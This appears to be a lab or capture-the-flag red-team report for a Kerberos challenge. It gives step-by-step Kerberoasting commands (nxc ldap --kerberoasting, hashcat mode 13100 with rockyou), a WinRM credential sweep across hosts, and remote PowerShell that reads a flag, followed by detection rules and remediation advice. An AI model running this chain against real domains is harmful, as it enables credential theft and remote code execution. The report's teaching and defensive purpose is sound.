@@ -1,0 +1,476 @@
+Red Team Engagement Report — Challenge: Dangerous
+Services (Kerberos, Easy, 500 pts)
+Auteur/Author: Ariel BOKO | v1.0 | 2026-10-04
+
+Challenge: Dangerous Services — "Kerberos is an authentication mechanism that works in
+three parts [...]. Now tell me, what if you already have a valid TGT, what is the problem with
+TGSREP?"
+Category: Kerberos — Easy — 500 pts
+Flag: EPI{SPN_juicE_f0r_d4y5}
+Vulnerability type: SPN Kerberoastable account (MITRE T1558.003) — Service Principal Name
+bound to a standard user account instead of a managed service account, with a dictionary-weak
+password.
+
+Executive Summary
+Using only the low-privileged enumeration account ( pentester ), I identified and abused a
+Kerberoastable service account to obtain full remote-command execution on a second host —
+without ever touching a privileged account or guessing a username.
+A single domain account, g.clooney , was registered with a Service Principal Name
+( HTTP/g.clooney.houndlabs.epi ) directly on a standard user object instead of a dedicated,
+machine-managed service account. Any authenticated domain user — including pentester — can
+request a Kerberos service ticket (TGS) for that SPN; that ticket is encrypted with the service
+account's own NTLM hash and can be cracked completely offline, with zero further interaction with
+the domain. The account's password ( CoffeeMug!1 ) was weak enough to be found in the rockyou
+wordlist in under 15 seconds. That same account turned out to hold local administrative WinRM
+access on the host SIRIUS , directly exposing a flag file on its desktop.
+Business impact. A single mis-provisioned user account (an SPN bound to a human account
+instead of a managed service account, combined with a weak, never-audited password) handed an
+attacker complete remote code execution on a domain-joined workstation. Because the request for a
+service ticket is a normal, unlogged-as-suspicious Kerberos operation, this entire chain —
+discovery, ticket extraction, offline cracking — leaves essentially no trace on the target until
+the attacker actually logs into SIRIUS .
+Top recommendations.
+1. Never bind a Service Principal Name to a standard user account; use a Group Managed Service
+Account (gMSA) instead, which carries a 120-character, automatically rotated password that
+cannot realistically be cracked.
+2. If a legacy SPN-on-user-account setup must be kept temporarily, enforce a long, random,
+non-dictionary password on that account and monitor it like a privileged credential.
+3. Remove g.clooney from any local administrative/WinRM-enabled group on SIRIUS ; audit all
+local group memberships granted to service-flavoured accounts across the domain.
+4. Detect and alert on Kerberoasting at the source: a burst of RC4/AES TGS-REQ requests for
+different SPNs from a single account in a short time window (Event ID 4769 with ticket
+encryption type 0x17 /RC4, high per-account frequency).
+
+Investigation & Technical Analysis
+Technical Incident Overview
+Starting from pentester:Password123! , an LDAP query for accounts carrying a
+servicePrincipalName attribute returned a single result: g.clooney . Requesting a TGS for that
+SPN (Kerberoasting) and cracking it offline with hashcat recovered the account's plaintext
+password in roughly 15 seconds. A subsequent WinRM access sweep across all six domain-joined
+workstations showed g.clooney holds local administrative rights over WinRM specifically on
+SIRIUS (10.42.0.157). A remote PowerShell session through that access located and read a flag
+file left on the account's own desktop.
+
+Scope & Methodology
+In-scope targets: 10.42.0.0/24 , 10.0.42.0/24 (lab subnets provided for the engagement).
+Hosts involved in this chain: DC01 (10.42.0.42 — Domain Controller) and SIRIUS
+(10.42.0.157 — Windows 10 / Server 2019 build 19041, domain member). Five other member hosts
+(GARM, SKOLL, ANUBIS, PROCYON, ARGOS) were tested and ruled out as part of the access sweep.
+Starting credentials: pentester:Password123! .
+Tooling: Exegol ( free image), netexec ( nxc ) — ldap and winrm protocol modules,
+hashcat v6.2.6 with the rockyou.txt wordlist, faketime (to work around a lab clock-skew
+issue, see below), ldapsearch .
+Approach: classic Kerberoasting methodology — SPN discovery via LDAP, TGS extraction,
+offline password cracking, then credential reuse / lateral-access sweep across every reachable
+host to find where the cracked account actually matters.
+
+A prerequisite worth documenting: Kerberos clock skew
+Before any Kerberos exchange could succeed, authentication failed with
+KRB_AP_ERR_SKEW (Clock skew too great) . Kerberos tickets are time-stamped and the KDC (the
+Domain Controller) rejects any exchange where the client's clock differs from its own by more than
+5 minutes — a deliberate anti-replay protection. Querying DC01 's own time service (it also acts
+as NTP server for the domain, like most DCs) showed a ~7-hour gap with the attacking
+container's clock. Rather than altering the container's real system clock (which would also shift
+the host's clock, and which Docker's default capabilities don't even permit), every Kerberosdependent command in this chain was run through faketime , which transparently fakes the
+wall-clock time seen by a single process without touching the real system time.
+
+Attack Chain & Detailed Findings
+Each step lists the exact command run, what every flag does, and what the output means. Raw
+evidence is archived in evidence/ .
+
+Step 1 — Confirm target reachability and measure clock skew
+nc -zv -w5 10.42.0.42 445
+nc -zv -w5 10.42.0.42 88
+date -u
+rdate -n -p -u -o 123 10.42.0.42
+
+Element
+
+Meaning
+
+nc -zv -w5
+<ip> <port>
+
+TCP connectivity probe: -z scans without sending data, -v is verbose, -w5 caps the wait at 5s. Checked here against
+445 (SMB) and 88 (Kerberos) to confirm both services are reachable before relying on them.
+
+date -u
+
+Prints the attacking container's current time in UTC, as a baseline for comparison.
+
+rdate -n -p
+-u -o 123
+10.42.0.42
+
+Queries the target's own time service. -n uses SNTP instead of the legacy RFC868 protocol; -p only prints the result
+instead of changing the local clock; -u uses UDP as transport; -o 123 targets port 123 (standard NTP), since Domain
+Controllers run the Windows Time service ( w32time ) there by default.
+
+Output (evidence: evidence/01_clock_check.txt ): container at 06:45:37 UTC , DC01 at
+14:47:01 WAT ( WAT = UTC+1, i.e. 13:47:01 UTC ) — a ~7h01 skew, far past Kerberos' 5-minute
+tolerance.
+MITRE ATT&CK: T1124 — System Time Discovery (reconnaissance step enabling the rest of the
+Kerberos-based chain).
+
+Step 2 — Kerberoasting: request a service ticket for every SPN-bearing account
+faketime "2026-10-04 13:47:30 UTC" nxc ldap 10.42.0.42 -u pentester -p 'Password123!' --kerberoasting /tmp/kh.txt
+
+Flag
+
+Meaning
+
+faketime "
+<date>"
+
+Wraps the following command, making the Kerberos library see the DC's real wall-clock time instead of the container's
+actual (skewed) system time — needed because nxc would otherwise fail its TGT/TGS requests with
+KRB_AP_ERR_SKEW .
+
+nxc ldap
+
+Targets the LDAP protocol (port 389) rather than SMB: LDAP is how a domain-joined tool queries the AD database
+(here, which accounts carry a servicePrincipalName ).
+
+-u pentester p
+'Password123!'
+
+The same low-privileged enumeration account used throughout the engagement — Kerberoasting requires no special
+privilege, which is precisely the weakness being demonstrated.
+
+-kerberoasting
+/tmp/kh.txt
+
+For every enabled account with an SPN, requests a Kerberos TGS for that SPN and writes the resulting ticket, in
+hashcat -ready format, to the given file.
+
+Output (evidence: evidence/02_kerberoasting.txt ):
+sAMAccountName: g.clooney, memberOf: [], pwdLastSet: 2026-07-30 ...
+$krb5tgs$23$*g.clooney$HOUNDLABS.EPI$HOUNDLABS.EPI\g.clooney*$<salt>$<encrypted blob>
+
+What it means: exactly one account in the entire domain is Kerberoastable: g.clooney ,
+with no group memberships beyond the implicit Domain Users . A separate LDAP query ( ldapsearch )
+confirmed its SPN: HTTP/g.clooney.houndlabs.epi — a web-service SPN bound to what is, by its
+naming convention and lack of group memberships, an ordinary employee account, not a managed
+service account. $krb5tgs$23$... is the TGS-REP ticket, encrypted ( etype 23 = RC4-HMAC) with
+g.clooney 's own NTLM hash — the cryptographic material we will try to recover offline.
+MITRE ATT&CK: T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting.
+
+Step 3 — Extract the captured ticket
+cat /tmp/kh.txt
+wc -l /tmp/kh.txt
+
+Output (evidence: evidence/03_hash_extraction.txt ): two $krb5tgs$23$... lines — two
+separate TGS tickets for the same account (one per --kerberoasting run performed during this
+engagement). Either one, or both, can be fed to the cracker; they will converge on the same
+plaintext password since they're both encrypted with the same account key.
+
+Step 4 — Crack the ticket offline
+hashcat -m 13100 /tmp/kh.txt /usr/share/wordlists/rockyou.txt --potfile-disable -o /tmp/cracked.txt
+cat /tmp/cracked.txt | rev | cut -d: -f1 | rev
+
+Flag
+
+Meaning
+
+-m 13100
+
+hashcat hash-mode identifier for "Kerberos 5, etype 23, TGS-REP" — tells hashcat exactly how to
+interpret and attack this specific ticket format.
+
+/tmp/kh.txt
+
+Input file with the captured ticket(s).
+
+/usr/share/wordlists/rockyou.txt
+
+~14.3 million real, leaked passwords — the de-facto standard dictionary for a first-pass offline
+crack.
+
+--potfile-disable
+
+Skips hashcat's cache of previously-cracked hashes, forcing a clean, visible run.
+
+-o /tmp/cracked.txt
+
+Writes hash:password pairs for every cracked entry.
+
+rev \| cut -d: -f1 \| rev
+
+Extracts just the password (the text after the last : ). A plain cut -d: -f2 would fail because
+the hash itself contains many : characters; reversing the line first makes the last field become
+the first, so cut -d: -f1 grabs it cleanly, then the second rev restores the original character
+order.
+
+Output (evidence: evidence/04_hashcat_crack.txt ): Recovered: 2/2 (100%) in about 14
+seconds of wall time, at ~2.1 million candidates/second on this hardware — recovered password:
+CoffeeMug!1 .
+What it means: a dictionary word ( CoffeeMug ) with a trivial !1 suffix is exactly the kind
+of password that resists nothing. The speed and success of this crack is a direct, measurable
+illustration of why SPNs must never be attached to human-managed, dictionary-susceptible
+passwords.
+MITRE ATT&CK: T1110.002 — Brute Force: Password Cracking (offline, against the recovered
+
+ticket — distinct from the online Kerberoasting request itself).
+
+Step 5 — Sweep every domain-joined host for where this account actually has access
+for ip in 10.42.0.178 10.42.0.109 10.42.0.157 10.42.0.130 10.42.0.106 10.42.0.102; do
+faketime "2026-10-04 13:59:00 UTC" nxc winrm $ip -u g.clooney -p 'CoffeeMug!1'
+done
+
+Element
+
+Meaning
+
+for ip
+in ...;
+do ...
+done
+
+Shell loop iterating the cracked credential against the IPs of every known domain member host (GARM, SKOLL, SIRIUS,
+ANUBIS, PROCYON, ARGOS).
+
+nxc
+winrm
+
+Targets WinRM (Windows Remote Management, port 5985) rather than SMB this time — the protocol behind PowerShell
+Remoting. nxc authenticates and, exactly like the SMB (admin) check used in the previous challenge, silently probes
+whether the account can actually execute commands over that channel, tagging the result (admin) if so.
+
+Output (evidence: evidence/05_winrm_access_sweep.txt ): authentication succeeds (or the host
+is simply unreachable, e.g. GARM ) everywhere, but only SIRIUS (10.42.0.157) grants
+g.clooney the (admin) tag over WinRM.
+What it means: this is the actual misconfiguration the challenge is named for — a
+Kerberoastable, dictionary-crackable account was also granted administrative WinRM rights on a
+workstation. Neither weakness alone would be catastrophic; combined, they turn a guessable
+password into remote code execution.
+MITRE ATT&CK: T1021.006 — Remote Services: Windows Remote Management.
+
+Step 6 — Locate the flag through a remote PowerShell session
+faketime "2026-10-04 14:01:00 UTC" nxc winrm 10.42.0.157 -u g.clooney -p 'CoffeeMug!1' \
+-X 'Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue -Include *flag*,*.txt | Select-Object Ful
+lName'
+
+Flag
+
+Meaning
+
+-X '<command>'
+
+Capital -X executes the given command specifically through PowerShell over the WinRM session (a lowercase -x
+would force cmd.exe , which this host's WinRM configuration does not accept — confirmed by an initial failed
+attempt during this engagement).
+
+Get-ChildItem Path C:\Users Recurse
+
+PowerShell equivalent of dir /s — recursively lists every file under C:\Users .
+
+-ErrorAction
+SilentlyContinue
+
+Suppresses access-denied errors on other users' profile folders instead of aborting the whole command.
+
+-Include
+*flag*,*.txt
+
+Filters results to filenames containing "flag" or ending in .txt .
+
+\| Select-Object
+FullName
+
+Prints only the full path of each match, for a readable result.
+
+Output (evidence: evidence/06_flag_search.txt ): a single match —
+C:\Users\g.clooney\Desktop\flag2.txt .
+
+Step 7 — Read the flag
+faketime "2026-10-04 14:02:00 UTC" nxc winrm 10.42.0.157 -u g.clooney -p 'CoffeeMug!1' \
+-X 'Get-Content C:\Users\g.clooney\Desktop\flag2.txt'
+Get-Content is PowerShell's equivalent of cat — prints the file's content.
+
+Flag obtained (evidence: evidence/07_flag_read.txt ):
+EPI{SPN_juicE_f0r_d4y5}
+
+MITRE ATT&CK: T1083 — File and Directory Discovery (Step 6) and T1005 — Data from Local
+System (Step 7).
+
+Root Cause Analysis
+Two independent weaknesses compound into this compromise:
+1. SPN bound to a standard user account. g.clooney was registered with a servicePrincipalName
+( HTTP/g.clooney.houndlabs.epi ) directly on what is otherwise an ordinary employee account
+(no group memberships, standard naming convention). This is the root enabler: Active Directory
+lets any authenticated account request a service ticket for any SPN — there is no privilege
+check at request time, only at the point the resulting ticket is actually used.
+2. Weak, dictionary-crackable password on that account, combined with no detection for the
+resulting Kerberoasting activity.
+3. Excessive local privilege — the same account additionally held administrative WinRM rights
+on SIRIUS , with no apparent functional justification.
+The initial entry point is the SPN registration on a human account (Step 2); everything after
+Step 4 (the crack) is a direct, mechanical consequence of reusing that single recovered password.
+
+Indicators of Compromise
+Type
+
+Value
+
+Target IP (DC)
+
+10.42.0.42 ( DC01 )
+
+Target IP
+(compromised
+host)
+
+10.42.0.157 ( SIRIUS )
+
+Domain
+
+HOUNDLABS.EPI
+
+Kerberoastable
+account
+
+g.clooney
+
+SPN
+
+HTTP/g.clooney.houndlabs.epi
+
+Cracked credential
+
+g.clooney : CoffeeMug!1
+
+Account with
+excess privilege
+
+g.clooney — administrative WinRM on SIRIUS
+
+Flag location
+
+C:\Users\g.clooney\Desktop\flag2.txt
+
+Technique
+markers
+
+LDAP SPN enumeration, Kerberos TGS-REQ for a non-interactive SPN, RC4 (etype 23) ticket encryption, offline
+hashcat mode 13100, WinRM (5985) remote PowerShell execution
+
+Impact Analysis
+Estimated severity: High (CVSS 3.1 ≈ 7.5) — vector reasoning:
+AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N
+
+- AV:N / AC:L — fully remote over the lab's reachable network, no special conditions beyond
+reachability to the DC and the target host.
+- PR:L — the attack requires some valid domain credential ( pentester ), but critically no
+privilege above a standard authenticated user — any compromised domain account would suffice.
+- UI:N — no user interaction required.
+- S:C (Scope Changed) — the compromise crosses a boundary: a credential cracked from a ticket
+issued by the DC is reused to gain code execution on an entirely different host ( SIRIUS ).
+- C:H / I:H — full remote code execution on SIRIUS via an administrative WinRM session.
+- A:N — no availability impact was caused or required.
+Blast radius:
+- Immediate: arbitrary PowerShell execution on SIRIUS as a local administrator-equivalent —
+file read/write, credential dumping (SAM/LSA, as demonstrated in the Catastrophic Failure
+challenge), persistence, and a pivot point for further lateral movement.
+- Detection gap: Kerberoasting itself (the TGS-REQ) is a legitimate, everyday Kerberos operation;
+without specific monitoring for RC4-encrypted TGS requests or per-account request volume, this
+entire chain is invisible until the attacker actually logs into SIRIUS .
+- Systemic risk: any other account with an SPN bound to a weak human-chosen password represents
+
+an identical, repeatable attack path — this is a pattern to audit domain-wide, not a one-off fix.
+
+Remediation & Recommendations
+Priority
+
+Recommendation
+
+Detection signal
+
+Critical
+
+Migrate g.clooney 's SPN to a Group Managed Service Account (gMSA). A gMSA's
+password is a random 120-character value rotated automatically by AD and never
+known to any human, making offline cracking infeasible.
+
+N/A (architectural fix)
+
+High
+
+If a human-account SPN must temporarily remain, enforce a long random password
+on it and treat it as a privileged credential (periodic rotation, no reuse, monitored
+logons).
+
+Password policy audit flag on any
+account with a non-empty
+servicePrincipalName .
+
+High
+
+Remove g.clooney from whatever local group grants WinRM administrative access
+on SIRIUS ; audit all hosts for similar grants to SPN-bearing accounts.
+
+Event ID 4732 (member added to a
+privileged local group) correlated
+against accounts carrying an SPN.
+
+High
+
+Deploy Kerberoasting detection: alert on TGS-REQ events (4769) requesting RC4
+encryption ( 0x17 ) for non-krbtgt SPNs, especially bursts covering many distinct SPNs
+from one account in a short window.
+
+SIEM rule on Event ID 4769, Ticket
+Encryption Type = 0x17 .
+
+Medium
+
+Enforce AES-only Kerberos encryption domain-wide (disable RC4) via msDSSupportedEncryptionTypes , removing the weakest, fastest-to-crack ticket format
+outright.
+
+Group Policy audit: "Network security:
+Configure encryption types allowed for
+Kerberos".
+
+Technical Choices & Alternatives
+Kerberoasting tool: nxc ldap --kerberoasting over Impacket's GetUserSPNs.py .
+Both would have returned the same TGS-REP ticket. nxc was chosen because the LDAP session used
+to enumerate the SPN-bearing account could be reused immediately for the ticket request in one
+command, whereas GetUserSPNs.py is a dedicated single-purpose script that would need to be
+invoked separately. The trade-off: GetUserSPNs.py supports -request-user to target one
+specific account without the surrounding LDAP enumeration noise, and prints a format string
+slightly more copy-paste-ready for some hashcat wrappers. For a domain with a single Kerberoastable
+account, the difference was immaterial; on a larger domain with many SPNs, GetUserSPNs.py -request piped straight to a
+file might be marginally faster to script.
+Cracking tool: hashcat over John the Ripper.
+hashcat was chosen for GPU-aware mode 13100 (Kerberos 5, etype 23, TGS-REP) and its faster
+candidate throughput on this hardware. John the Ripper's krb5tgs format would have reached the
+same password, just measurably slower on a CPU-only run — for a single weak password this barely
+mattered (seconds either way), but the choice would matter more against a longer, non-dictionary
+password where GPU throughput becomes the deciding factor.
+Decision revised mid-engagement: system clock vs. per-process time faking.
+The first Kerberoasting attempt failed with KRB_AP_ERR_SKEW . The initial instinct was to
+correct the container's real system clock — but Docker's default capability set does not grant
+CAP_SYS_TIME , so rdate -s failed with "Operation not permitted", and even if it had succeeded,
+changing the container's clock would also have shifted the host's clock, since containers share
+the kernel's wall clock with the host unless explicit time namespaces are used (not the case here).
+The approach was revised to faketime , which fakes the wall-clock time seen by a single process
+via LD_PRELOAD , with no privilege requirement and no effect outside that one command. This is a
+concrete example of a plan changed under an unexpected operational constraint (missing container
+capability) rather than persisting with an approach that would have required elevated,
+unavailable permissions or risked desynchronising the attacking host itself.
+
+Appendices
+evidence/01_clock_check.txt — Step 1 raw output (connectivity + clock-skew measurement).
+evidence/02_kerberoasting.txt — Step 2 raw Kerberoasting output.
+evidence/03_hash_extraction.txt — Step 3 raw captured ticket file.
+evidence/04_hashcat_crack.txt — Step 4 raw hashcat session and extracted password.
+evidence/05_winrm_access_sweep.txt — Step 5 raw WinRM access sweep across all 6 hosts.
+evidence/06_flag_search.txt — Step 6 raw PowerShell file-search output.
+evidence/07_flag_read.txt — Step 7 raw flag content.
+
+⚠ IMPORTANT
+Screenshots/terminal recordings for each step above are available on request from the Exegol
+container's asciinema session logs (`~/.exegol/workspaces/bloodhound/logs/`) and can be attached
+to the final PDF submission if the grading format requires inline visuals rather than appended
+text evidence.
+
+
